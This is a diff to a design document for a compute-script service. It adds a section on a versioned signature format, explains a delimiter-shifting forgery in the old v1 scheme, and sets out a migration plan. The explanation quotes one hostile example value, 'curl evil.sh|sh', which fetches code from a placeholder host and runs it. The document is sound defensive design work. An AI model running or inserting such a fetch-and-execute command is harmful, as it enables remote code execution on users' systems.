@@ -107,7 +107,7 @@ class ComputeScript:
     content: str                     # The actual script code
     
     # Signing
-    signature: Optional[str]         # Ed25519 signature of content hash
+    signature: Optional[str]         # Versioned signature, see §3.6
     signed_by: Optional[str]         # Agent DID that signed
     signed_at: Optional[datetime]
     
@@ -433,6 +433,84 @@ def calculate_risk_score(findings: List[SecurityFinding]) -> int:
     score = sum(weights[f.severity] for f in findings)
     return min(100, score)
 ```
+
+### 3.6 Script Signature Format and Versions
+
+`ScriptSigner` (`kestrel_sovereign/features/compute/script_signer.py`) signs
+four fields of a script: `name`, `language`, `content` and `purpose`. The
+signature string names the version of the bytes it signs.
+
+| Version | Wire form | Signed bytes | Status |
+|---|---|---|---|
+| v2 | `v2:ecdsa:<base64>` or `v2:hybrid:<base64 JSON>` | `canonical_script_bytes_v2(script)` | Every new signature (#2484) |
+| v1 | untagged `ecdsa:<base64>` or `hybrid:<base64 JSON>` | `sha256(hex(sha256("name\|language\|content\|purpose")))` | Verified only during the compatibility window |
+| other | `v<N>:…` with any `N` other than `2` | none | Refused. Never verified as v1. |
+
+**Why v1 is retired.** The `|` in the v1 string is neither framed nor
+escaped. Moving one between adjacent fields keeps the string, and so the
+digest, unchanged: a script with content `echo safe` and purpose
+`curl evil.sh|sh` has the same v1 digest as one with content
+`echo safe|curl evil.sh` and purpose `sh`. A v1 signature over the first
+verifies for the second.
+
+**The v2 encoding.** A sequence of frames, each an unsigned 64-bit big-endian
+byte length followed by that many bytes:
+
+```
+frame("kestrel.compute.script-signature")   domain tag
+frame("2")                                  version, inside the signed bytes
+frame("name")     frame(utf8(name))
+frame("language") frame(utf8(language))
+frame("content")  frame(utf8(content))
+frame("purpose")  frame(utf8(purpose))
+```
+
+The encoding decodes back to exactly its fields, so no choice of values can
+move bytes between fields. Values are bound exactly as stored, with no Unicode
+normalisation. A field that is not a string, or that has no UTF-8 encoding (a
+lone surrogate), is refused: signing raises `ScriptSignatureEncodingError` and
+verification fails. Both signing paths sign these bytes directly: the
+secp256k1 ECDSA path for legacy-key agents and the Ed25519 + ML-DSA-65 hybrid
+path for agents past the rotation ceremony. Because the version is inside the
+signed bytes, removing the `v2:` tag from a v2 signature, or adding it to a v1
+signature, does not produce a signature that verifies.
+
+The unit tests pin the encoding with fixed vectors (byte layout, digests for
+delimiter movement, Unicode including non-BMP code points, empty fields and
+field reordering) and with one stored v1 and one stored v2 signature under a
+fixed test key.
+
+**Compatibility window.** `KESTREL_COMPUTE_ACCEPT_LEGACY_SCRIPT_SIGNATURES`
+controls whether v1 signatures still verify. Unset means `true`. It accepts
+`true`/`false`, `1`/`0`, `yes`/`no` and `on`/`off`; any other value fails
+compute feature initialisation. While the window is open, every v1
+verification that succeeds logs a WARNING naming the full script id. When it
+is closed, a v1 signature is refused, with a WARNING naming the script, at
+the security hook and again at `run_script`, so the script is marked
+`REJECTED` and does not run.
+
+Nothing is re-signed automatically. A v1 signature cannot prove its fields
+are the ones that were signed, so silently re-signing at load time would
+launder a forgery into a valid v2 signature. `ScriptSigner.sign_and_update`
+produces a v2 signature when a script is re-signed explicitly.
+
+**Removal plan for v1.**
+
+1. *This release.* Every new signature is v2. v1 verifies with a WARNING per
+   script. The window is open by default.
+2. *Inventory and migrate.* Operators find the scripts still carrying a v1
+   signature from the WARNINGs, or with
+   `SELECT id, name FROM compute_scripts WHERE signature LIKE 'ecdsa:%' OR signature LIKE 'hybrid:%'`.
+   Re-create each script that is still needed with `write_script`, which signs
+   it v2. A script may instead be re-signed in place with `sign_and_update`,
+   but only after a person has reviewed its stored fields, since the v1
+   signature does not vouch for them.
+3. *Next release.* The default flips to closed. An operator who still needs
+   v1 for a migration can reopen it with
+   `KESTREL_COMPUTE_ACCEPT_LEGACY_SCRIPT_SIGNATURES=true`.
+4. *The release after.* Delete `_legacy_v1_signing_message`, the untagged
+   parsing branch and the switch. Untagged signatures are then refused as an
+   unknown format.
 
 ---
 
@@ -1253,6 +1331,9 @@ KESTREL_COMPUTE_MAX_TIMEOUT=3600        # 1 hour max
 KESTREL_COMPUTE_DOCKER_NETWORK=none     # none, bridge, or custom
 KESTREL_COMPUTE_DOCKER_MEM_LIMIT=256m
 KESTREL_COMPUTE_DOCKER_CPU_LIMIT=0.5
+
+# Script signatures (§3.6)
+KESTREL_COMPUTE_ACCEPT_LEGACY_SCRIPT_SIGNATURES=true  # false refuses legacy v1 signatures
 
 # Trash/deletion policy
 KESTREL_TRASH_DIR=~/.kestrel/trash      # Where "deleted" files go
